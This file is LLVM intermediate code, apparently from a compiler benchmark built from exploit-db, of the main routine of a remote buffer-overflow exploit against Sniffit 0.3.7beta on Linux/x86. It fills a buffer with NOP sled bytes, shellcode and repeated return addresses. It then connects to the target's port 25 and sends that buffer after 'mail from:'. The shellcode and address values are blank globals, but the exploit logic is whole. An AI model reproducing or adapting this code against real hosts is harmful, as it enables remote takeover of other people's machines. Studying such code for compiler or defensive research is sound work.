; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19886.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19886.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@LENGTH = common dso_local global i32 0, align 4
@ALIGNOP = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"Usage: %s <sniffit host>\0A\00", align 1
@RET = common dso_local global i64 0, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [47 x i8] c"\0ASniffit <=0.3.7beta Linux/x86 Remote Exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [48 x i8] c"by FuSyS [S0ftpj|BFi] - http://www.s0ftpj.org\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"Connecting to %s ...\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [21 x i8] c"Can't create socket\0A\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"Can't connect to Sniffit Server\0A\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"Injecting ShellCode ...\0A\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"mail from:\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"Done!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [610 x i8], align 16
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @LENGTH, align 4
  %17 = load i32, i32* @ALIGNOP, align 4
  %18 = add nsw i32 %16, %17
  %19 = add nsw i32 %18, 1
  %20 = zext i32 %19 to i64
  %21 = call i8* @llvm.stacksave()
  store i8* %21, i8** %6, align 8
  %22 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %7, align 8
  %23 = load i32, i32* @OFFSET, align 4
  store i32 %23, i32* %11, align 4
  %24 = load i32, i32* %4, align 4
  %25 = icmp slt i32 %24, 2
  br i1 %25, label %26, label %33

26:                                               ; preds = %2
  %27 = load i32, i32* @stderr, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @fprintf(i32 %27, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8* %30)
  %32 = call i32 @exit(i32 0) #4
  unreachable

33:                                               ; preds = %2
  %34 = load i64, i64* @RET, align 8
  store i64 %34, i64* %10, align 8
  %35 = load i64, i64* %10, align 8
  %36 = load i32, i32* %11, align 4
  %37 = sext i32 %36 to i64
  %38 = sub i64 %35, %37
  store i64 %38, i64* %9, align 8
  store i32 0, i32* %12, align 4
  br label %39

39:                                               ; preds = %48, %33
  %40 = load i32, i32* %12, align 4
  %41 = load i32, i32* @ALIGNOP, align 4
  %42 = sub nsw i32 120, %41
  %43 = icmp slt i32 %40, %42
  br i1 %43, label %44, label %51

44:                                               ; preds = %39
  %45 = load i32, i32* %12, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %22, i64 %46
  store i8 -112, i8* %47, align 1
  br label %48

48:                                               ; preds = %44
  %49 = load i32, i32* %12, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %12, align 4
  br label %39

51:                                               ; preds = %39
  store i32 0, i32* %13, align 4
  br label %52

52:                                               ; preds = %66, %51
  %53 = load i32, i32* %13, align 4
  %54 = load i8*, i8** @shellcode, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = icmp slt i32 %53, %55
  br i1 %56, label %57, label %71

57:                                               ; preds = %52
  %58 = load i8*, i8** @shellcode, align 8
  %59 = load i32, i32* %13, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = load i32, i32* %12, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %22, i64 %64
  store i8 %62, i8* %65, align 1
  br label %66

66:                                               ; preds = %57
  %67 = load i32, i32* %12, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %12, align 4
  %69 = load i32, i32* %13, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %13, align 4
  br label %52

71:                                               ; preds = %52
  %72 = load i32, i32* %12, align 4
  %73 = sub nsw i32 %72, 1
  store i32 %73, i32* %12, align 4
  br label %74

74:                                               ; preds = %109, %71
  %75 = load i32, i32* %12, align 4
  %76 = load i32, i32* @LENGTH, align 4
  %77 = icmp slt i32 %75, %76
  br i1 %77, label %78, label %112

78:                                               ; preds = %74
  %79 = load i64, i64* %9, align 8
  %80 = and i64 %79, 255
  %81 = trunc i64 %80 to i8
  %82 = load i32, i32* %12, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %22, i64 %83
  store i8 %81, i8* %84, align 1
  %85 = load i64, i64* %9, align 8
  %86 = and i64 %85, 65280
  %87 = ashr i64 %86, 8
  %88 = trunc i64 %87 to i8
  %89 = load i32, i32* %12, align 4
  %90 = add nsw i32 %89, 1
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %22, i64 %91
  store i8 %88, i8* %92, align 1
  %93 = load i64, i64* %9, align 8
  %94 = and i64 %93, 16711680
  %95 = ashr i64 %94, 16
  %96 = trunc i64 %95 to i8
  %97 = load i32, i32* %12, align 4
  %98 = add nsw i32 %97, 2
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %22, i64 %99
  store i8 %96, i8* %100, align 1
  %101 = load i64, i64* %9, align 8
  %102 = and i64 %101, 4278190080
  %103 = ashr i64 %102, 24
  %104 = trunc i64 %103 to i8
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 3
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %22, i64 %107
  store i8 %104, i8* %108, align 1
  br label %109

109:                                              ; preds = %78
  %110 = load i32, i32* %12, align 4
  %111 = add nsw i32 %110, 4
  store i32 %111, i32* %12, align 4
  br label %74

112:                                              ; preds = %74
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0))
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.2, i64 0, i64 0))
  %115 = call i32 @memset(%struct.sockaddr_in* %15, i32 0, i32 12)
  %116 = load i32, i32* @AF_INET, align 4
  %117 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %116, i32* %117, align 4
  %118 = call i32 @htons(i32 25)
  %119 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i32 %118, i32* %119, align 4
  %120 = load i8**, i8*** %5, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 1
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @nameResolve(i8* %122)
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  %125 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %124, i32 0, i32 0
  store i32 %123, i32* %125, align 4
  %126 = load i8**, i8*** %5, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 1
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %128)
  %130 = load i32, i32* @AF_INET, align 4
  %131 = load i32, i32* @SOCK_STREAM, align 4
  %132 = call i32 @socket(i32 %130, i32 %131, i32 0)
  store i32 %132, i32* %14, align 4
  %133 = icmp slt i32 %132, 0
  br i1 %133, label %134, label %137

134:                                              ; preds = %112
  %135 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %136 = call i32 @exit(i32 0) #4
  unreachable

137:                                              ; preds = %112
  %138 = load i32, i32* %14, align 4
  %139 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %140 = call i64 @connect(i32 %138, %struct.sockaddr* %139, i32 12)
  %141 = icmp slt i64 %140, 0
  br i1 %141, label %142, label %145

142:                                              ; preds = %137
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0))
  %144 = call i32 @exit(i32 0) #4
  unreachable

145:                                              ; preds = %137
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  %147 = getelementptr inbounds [610 x i8], [610 x i8]* %8, i64 0, i64 0
  %148 = call i32 @strncat(i8* %147, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i32 10)
  %149 = getelementptr inbounds [610 x i8], [610 x i8]* %8, i64 0, i64 0
  %150 = call i32 @strlen(i8* %22)
  %151 = call i32 @strncat(i8* %149, i8* %22, i32 %150)
  %152 = load i32, i32* %14, align 4
  %153 = getelementptr inbounds [610 x i8], [610 x i8]* %8, i64 0, i64 0
  %154 = getelementptr inbounds [610 x i8], [610 x i8]* %8, i64 0, i64 0
  %155 = call i32 @strlen(i8* %154)
  %156 = call i32 @write(i32 %152, i8* %153, i32 %155)
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %158 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %158)
  %159 = load i32, i32* %3, align 4
  ret i32 %159
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @nameResolve(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @strncat(i8*, i8*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
